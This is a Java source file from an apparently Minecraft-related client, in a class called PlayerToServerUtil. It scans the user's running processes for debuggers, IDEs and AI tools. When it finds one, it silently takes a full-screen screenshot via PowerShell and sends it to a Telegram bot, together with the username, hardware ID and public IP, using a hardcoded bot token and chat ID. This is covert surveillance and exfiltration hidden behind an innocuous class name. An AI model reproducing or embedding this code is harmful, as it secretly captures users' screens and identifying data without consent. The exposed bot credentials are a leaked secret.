package fun.nexisdlc.client.utils.player;

import fun.nexisdlc.client.utils.client.SoundUtil;
import lombok.Getter;
import lombok.extern.log4j.Log4j2;
import ru.sterford.Initializator;
import ru.sterford.annotations.NativeCall;

import java.io.*;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

@Log4j2
@NativeCall
public class PlayerToServerUtil {

    private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(6))
            .build();

    private static final Set<String> FORBIDDEN_PROCESSES = Set.of(
            "httpdebuggersvc.exe", "die.exe", "ida64.exe", "ida.exe",
            "x64dbg.exe", "x64dbg-unsigned.exe", "x32dbg.exe", "x32dbg-unsigned.exe",
            "vsdbg.exe", "idea64.exe", "jetbrains_client64.exe", "ProcessHacker.exe",
            "codex.exe", "codex-command-runner.exe", "codex-windows-sandbox-setup.exe");

    private static final Map<String, String> PROCESS_CATEGORIES = Map.ofEntries(
            Map.entry("httpdebuggersvc.exe", "network"),
            Map.entry("die.exe", "debugging"),
            Map.entry("ida64.exe", "debugging"),
            Map.entry("ida.exe", "debugging"),
            Map.entry("x64dbg.exe", "debugging"),
            Map.entry("x64dbg-unsigned.exe", "debugging"),
            Map.entry("x32dbg.exe", "debugging"),
            Map.entry("x32dbg-unsigned.exe", "debugging"),
            Map.entry("vsdbg.exe", "debugging"),
            Map.entry("idea64.exe", "developing"),
            Map.entry("jetbrains_client64.exe", "developing"),
            Map.entry("ProcessHacker.exe", "process_tool"),
            Map.entry("codex.exe", "ai"),
            Map.entry("codex-command-runner.exe", "ai"),
            Map.entry("codex-windows-sandbox-setup.exe", "ai"));

    private static final Pattern IPV4_PATTERN = Pattern.compile(
            "^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$");

    private static final Set<String> reportedProcesses = ConcurrentHashMap.newKeySet();
    private static volatile String lastReportedProcessesHash = "";

    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private final AtomicBoolean running = new AtomicBoolean(false);

    @Getter
    private final String username;
    @Getter
    private final String uid;
    @Getter
    private final String hwid;
    @Getter
    private final String role;
    @Getter
    private volatile String date;

    public PlayerToServerUtil(String username, String uid, String hwid, String role) {
        this.username = username != null ? username : "unknown";
        this.uid = uid != null ? uid : "unknown";
        this.hwid = hwid != null ? hwid : "unknown";
        this.role = role != null ? role : "unknown";
        this.date = detectIpAddress();
    }

    private String detectIpAddress() {
        String publicIp = getPublicIpFromServices();
        if (publicIp != null && !publicIp.equals("unknown")) {
            return publicIp;
        }

        String localIp = getLocalIpAddress();
        return localIp != null ? localIp : "unknown";
    }

    private String getPublicIpFromServices() {
        List<String> ipServices = Arrays.asList(
                "https://api.ipify.org",
                "https://icanhazip.com",
                "https://checkip.amazonaws.com",
                "https://ifconfig.me/ip",
                "https://api.my-ip.io/ip",
                "https://ipv4.icanhazip.com");

        for (String serviceUrl : ipServices) {
            try {
                HttpURLConnection connection = (HttpURLConnection) new URL(serviceUrl).openConnection();
                connection.setConnectTimeout(3000);
                connection.setReadTimeout(3000);
                connection.setRequestProperty("User-Agent", "Mozilla/5.0");

                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    String ip = reader.readLine();
                    if (ip != null && isValidIpv4(ip.trim())) {
                        return ip.trim();
                    }
                }
            } catch (Exception e) {
            }
        }
        return null;
    }

    private String getLocalIpAddress() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();

                if (networkInterface.isLoopback() || !networkInterface.isUp()) {
                    continue;
                }

                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    String hostAddress = addr.getHostAddress();

                    if (!addr.isLoopbackAddress() && isValidIpv4(hostAddress)) {
                        return hostAddress;
                    }
                }
            }

            InetAddress localHost = InetAddress.getLocalHost();
            String hostAddress = localHost.getHostAddress();
            if (isValidIpv4(hostAddress)) {
                return hostAddress;
            }

        } catch (Exception e) {
        }
        return "unknown";
    }

    private boolean isValidIpv4(String ip) {
        if (ip == null || ip.isEmpty())
            return false;
        return IPV4_PATTERN.matcher(ip).matches();
    }

    public void refresDdate() {
        String newIp = detectIpAddress();
        if (!newIp.equals(this.date)) {
            this.date = newIp;
        }
    }

    public void connectionToServer(long intervalSeconds) {
        if (running.getAndSet(true)) {
            return;
        }
        scheduler.schedule(() -> {
            checkProcesses();
            scheduler.scheduleAtFixedRate(this::checkProcesses, intervalSeconds, intervalSeconds, TimeUnit.SECONDS);
        }, 0, TimeUnit.SECONDS);

        scheduler.scheduleAtFixedRate(this::refresDdate, 5, 5, TimeUnit.MINUTES);

        Runtime.getRuntime().addShutdownHook(new Thread(this::stopMonitoring));
    }

    public void stopMonitoring() {
        if (running.getAndSet(false)) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(2, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    private void checkProcesses() {
        try {
            List<String> runningProcesses = getRunningProcesses();
            Map<String, List<String>> foundForbidden = new LinkedHashMap<>();

            for (String process : runningProcesses) {
                String lowerProcess = process.toLowerCase();
                for (String forbidden : FORBIDDEN_PROCESSES) {
                    if (lowerProcess.equals(forbidden.toLowerCase()) ||
                            lowerProcess.endsWith("\\" + forbidden.toLowerCase()) ||
                            lowerProcess.equals(forbidden.toLowerCase().replace(".exe", ""))) {

                        String category = PROCESS_CATEGORIES.getOrDefault(forbidden, "unknown");
                        foundForbidden.computeIfAbsent(category, k -> new ArrayList<>())
                                .add(forbidden);
                        break;
                    }
                }
            }

            if (!foundForbidden.isEmpty()) {
                handleFoundProcesses(foundForbidden);
            }

        } catch (Exception e) {
            log.warn("Failed while checking forbidden processes", e);
        }
    }

    private List<String> getRunningProcesses() throws IOException, InterruptedException {
        List<String> processes = new ArrayList<>();
        String os = System.getProperty("os.name").toLowerCase();

        ProcessBuilder processBuilder;

        if (os.contains("win")) {
            processBuilder = new ProcessBuilder("tasklist", "/FO", "CSV", "/NH");
        } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
            processBuilder = new ProcessBuilder("ps", "-e", "-o", "comm=");
        } else {
            return processes;
        }

        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty())
                    continue;

                if (os.contains("win")) {
                    if (line.startsWith("\"")) {
                        int endQuote = line.indexOf("\"", 1);
                        if (endQuote > 0) {
                            String procName = line.substring(1, endQuote);
                            processes.add(procName.toLowerCase());
                        }
                    }
                } else {
                    String procName = line.substring(line.lastIndexOf('/') + 1);
                    if (procName.endsWith(".exe") || !procName.contains(".")) {
                        processes.add(procName.toLowerCase());
                    }
                }
            }
        }

        process.waitFor(3, TimeUnit.SECONDS);
        return processes;
    }

    private File takeScreenshotToFile() {
        try {
            File screenshotFile = File.createTempFile("screenshot_", ".png");

            ProcessBuilder processBuilder = new ProcessBuilder(
                    "powershell.exe",
                    "-Command",
                    "Add-Type -AssemblyName System.Windows.Forms; " +
                            "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
                            "$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); " +
                            "$graphics = [System.Drawing.Graphics]::FromImage($bitmap); " +
                            "$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); " +
                            "$bitmap.Save('" + screenshotFile.getAbsolutePath().replace("\\", "\\\\") + "')"
            );

            Process process = processBuilder.start();
            boolean finished = process.waitFor(5, TimeUnit.SECONDS);

            if (finished && process.exitValue() == 0 && screenshotFile.exists() && screenshotFile.length() > 0) {
                return screenshotFile;
            }

            screenshotFile.delete();
            return null;

        } catch (Exception e) {
            return null;
        }
    }

    private void handleFoundProcesses(Map<String, List<String>> foundForbidden) {
        String currentHash = generateProcessesHash(foundForbidden);

        if (this.uid != null && (this.uid.equals("1") || this.uid.equals("2"))) {
           return;
        }


        if (currentHash.equals(lastReportedProcessesHash)) {
            return;
        }

        List<String> newProcesses = new ArrayList<>();
        for (List<String> procs : foundForbidden.values()) {
            for (String proc : procs) {
                if (!reportedProcesses.contains(proc)) {
                    newProcesses.add(proc);
                    reportedProcesses.add(proc);
                }
            }
        }

        if (!newProcesses.isEmpty()) {
            playAlertSoundsAlternating();

            sendTelegramAlert(foundForbidden, newProcesses);
            lastReportedProcessesHash = currentHash;
        }
    }

    private void playAlertSoundsAlternating() {
        SoundUtil.playSound("attack/sound1", 75, true);
        //scheduler.schedule(() -> SoundUtil.playSound("attack/sound1", 100, true), 1, TimeUnit.SECONDS);
        //scheduler.schedule(() -> SoundUtil.playSound("attack/sound2", 100, true), 2, TimeUnit.SECONDS);
    }


    private String generateProcessesHash(Map<String, List<String>> foundForbidden) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, List<String>> entry : foundForbidden.entrySet()) {
            sb.append(entry.getKey()).append(":");
            entry.getValue().stream().sorted().forEach(sb::append);
            sb.append(";");
        }
        return Integer.toHexString(sb.toString().hashCode());
    }

    private void sendTelegramAlert(Map<String, List<String>> foundForbidden, List<String> newProcesses) {
        refresDdate();

        String message = buildAlertMessage(foundForbidden, newProcesses);
        File screenshotFile = takeScreenshotToFile();

        if (screenshotFile != null && screenshotFile.exists()) {
            sendPhotoToTelegram("8707615571:AAE6g9rAqKN2KP46Y_z0YpTaDfOqd60QvoU", message, screenshotFile);
            try {
                screenshotFile.delete();
            } catch (Exception e) {
                log.warn("Failed to delete temp screenshot file", e);
            }
        } else {
            sendTextToTelegram("8707615571:AAE6g9rAqKN2KP46Y_z0YpTaDfOqd60QvoU", message);
        }
    }

    private void sendTextToTelegram(String botToken, String message) {
        String payload = "chat_id=" + encodeValue("-1003728345727")
                + "&message_thread_id=4"
                + "&parse_mode=" + encodeValue("HTML")
                + "&text=" + encodeValue(message);

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://api.telegram.org/bot" + botToken + "/sendMessage"))
                .header("Content-Type", "application/x-www-form-urlencoded")
                .timeout(Duration.ofSeconds(8))
                .POST(HttpRequest.BodyPublishers.ofString(payload))
                .build();

        HTTP_CLIENT.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                .thenAccept(response -> {
                    if (response.statusCode() < 200 || response.statusCode() >= 300) {
                        log.warn("Failed to send text alert, HTTP: {}, response: {}",
                                response.statusCode(), response.body());
                    }
                })
                .exceptionally(throwable -> {
                    log.warn("Failed to send text alert", throwable);
                    return null;
                });
    }

    private void sendPhotoToTelegram(String botToken, String caption, File photoFile) {
        try {
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
            String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
                os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes(StandardCharsets.UTF_8));
                os.write(("-1003728345727\r\n").getBytes(StandardCharsets.UTF_8));

                os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
                os.write("Content-Disposition: form-data; name=\"message_thread_id\"\r\n\r\n".getBytes(StandardCharsets.UTF_8));
                os.write(("4\r\n").getBytes(StandardCharsets.UTF_8));

                os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
                os.write("Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n".getBytes(StandardCharsets.UTF_8));
                os.write(("HTML\r\n").getBytes(StandardCharsets.UTF_8));

                os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
                os.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".getBytes(StandardCharsets.UTF_8));
                os.write((caption + "\r\n").getBytes(StandardCharsets.UTF_8));

                os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"\r\n").getBytes(StandardCharsets.UTF_8));
                os.write("Content-Type: image/png\r\n\r\n".getBytes(StandardCharsets.UTF_8));

                Files.copy(photoFile.toPath(), os);
                os.write("\r\n".getBytes(StandardCharsets.UTF_8));

                os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            if (responseCode >= 200 && responseCode < 300) {
                log.info("Screenshot sent for user: {}", username);
            } else {
                log.warn("Failed to send screenshot, HTTP: {}", responseCode);
                sendTextToTelegram(botToken, caption);
            }

            conn.disconnect();

        } catch (Exception e) {
            log.error("Error sending photo", e);
            sendTextToTelegram(botToken, caption);
        }
    }

    private String buildAlertMessage(Map<String, List<String>> foundForbidden, List<String> newProcesses) {
        String timestamp = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss")
                .withZone(ZoneId.of("Asia/Krasnoyarsk"))
                .format(Instant.now());

        StringBuilder processesStr = new StringBuilder();
        for (Map.Entry<String, List<String>> entry : foundForbidden.entrySet()) {
            if (processesStr.length() > 0)
                processesStr.append(" + ");
            processesStr.append(entry.getKey()).append("[").append(String.join(",", entry.getValue())).append("]");
        }

        return "\uD83D\uDEA8 <b>Обнаружен запрещенный процесс!</b>\n\n"
                + "\uD83D\uDC64 <b>Username:</b> <code>" + escapeHtml(username) + "</code>\n"
                + "\uD83C\uDFF7 <b>Role:</b> <code>" + escapeHtml(role) + "</code>\n"
                + "\uD83C\uDD94 <b>UID:</b> <code>" + escapeHtml(uid) + "</code>\n"
                + "\uD83D\uDD10 <b>HWID:</b> <code>" + escapeHtml(hwid) + "</code>\n"
                + "\uD83C\uDF10 <b>IP:</b> <code>" + escapeHtml(date) + "</code>\n\n"
                + "\uD83D\uDD2E <b>Процессы:</b> <code>Запрещённые: " + processesStr + "</code>\n"
                + "\uD83D\uDD25 <b>Новые:</b> <code>" + String.join(", ", newProcesses) + "</code>\n"
                + "\u23F0 <b>Время:</b> <code>" + escapeHtml(timestamp) + "</code>";
    }

    private static String encodeValue(String value) {
        return URLEncoder.encode(value, StandardCharsets.UTF_8);
    }

    private static String escapeHtml(String value) {
        if (value == null)
            return "unknown";
        return value.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }
}